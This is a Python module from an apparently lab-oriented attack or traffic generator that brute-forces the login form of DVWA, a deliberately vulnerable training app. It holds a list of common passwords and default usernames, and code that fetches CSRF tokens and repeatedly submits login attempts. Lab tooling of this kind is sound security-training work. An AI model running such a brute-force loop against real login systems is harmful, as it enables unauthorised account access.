"""Brute-force login attack against DVWA."""

import random
from .base import AttackModule, logger

PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome", "monkey",
    "dragon", "master", "qwerty", "login", "abc123", "trustno1",
    "iloveyou", "shadow", "123123", "654321", "superman", "michael",
    "football", "passw0rd", "batman", "access", "hello", "charlie",
]

USERNAMES = ["admin", "gordonb", "1337", "pablo", "smithy"]


class BruteForce(AttackModule):
    NAME = "brute_force"

    def _attack(self, session, count: int):
        for _ in range(count):
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            token = session.get_csrf_token("/vulnerabilities/brute/")
            session.get(
                "/vulnerabilities/brute/",
                params={
                    "username": user,
                    "password": pwd,
                    "Login": "Login",
                    "user_token": token,
                },
            )
            logger.debug("[brute_force] Tried %s:%s", user, pwd)

    def run_low(self, session):
        self._attack(session, random.randint(8, 15))

    def run_medium(self, session):
        self._attack(session, random.randint(5, 10))

    def run_high(self, session):
        self._attack(session, random.randint(3, 6))
